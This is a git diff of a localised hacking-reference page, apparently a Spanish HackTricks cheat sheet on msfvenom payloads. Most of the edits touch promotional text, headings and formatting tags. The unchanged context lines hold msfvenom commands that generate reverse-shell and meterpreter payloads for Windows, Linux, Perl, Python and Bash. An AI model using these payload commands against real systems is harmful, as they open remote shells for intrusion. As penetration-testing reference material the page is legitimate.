@@ -20,13 +20,13 @@ Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" d
 Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!
 
 **Hacking Insights**\
-Participa en contenido que profundiza en la emoción y los desafíos del hacking
+Engage with content that delves into the thrill and challenges of hacking
 
 **Real-Time Hack News**\
-Mantente al día con el mundo del hacking de ritmo rápido a través de noticias e información en tiempo real
+Keep up-to-date with fast-paced hacking world through real-time news and insights
 
 **Latest Announcements**\
-Mantente informado sobre las nuevas recompensas por errores que se lanzan y actualizaciones cruciales de la plataforma
+Stay informed with the newest bug bounties launching and crucial platform updates
 
 **Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!
 
@@ -61,7 +61,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
 {% endcode %}
 
-### Shell de Vinculación
+### Shell de enlace
 
 {% code overflow="wrap" %}
 ```bash
@@ -119,7 +119,7 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
 ```
 {% endcode %}
 
-### Shell de Vinculación
+### Shell de enlace
 
 {% code overflow="wrap" %}
 ```bash
@@ -210,16 +210,12 @@ msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > 
 {% endcode %}
 
 ### **Python**
-
-{% code overflow="wrap" %}
 ```bash
 msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
 ```
 {% endcode %}
 
 ### **Bash**
-
-{% code overflow="wrap" %}
 ```bash
 msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
 ```
@@ -236,7 +232,7 @@ Participa en contenido que profundiza en la emoción y los desafíos del hacking
 Mantente al día con el mundo del hacking de ritmo rápido a través de noticias e información en tiempo real
 
 **Últimos Anuncios**\
-Mantente informado sobre los nuevos programas de recompensas por bugs que se lanzan y actualizaciones cruciales de la plataforma
+Mantente informado sobre las nuevas recompensas por bugs que se lanzan y actualizaciones cruciales de la plataforma
 
 **Únete a nosotros en** [**Discord**](https://discord.com/invite/N3FrSbmwdy) y comienza a colaborar con los mejores hackers hoy mismo!
 
@@ -250,7 +246,7 @@ Aprende y practica Hacking en GCP: <img src="../../.gitbook/assets/grte.png" alt
 
 * Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
 * **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
-* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.
 
 </details>
 {% endhint %}
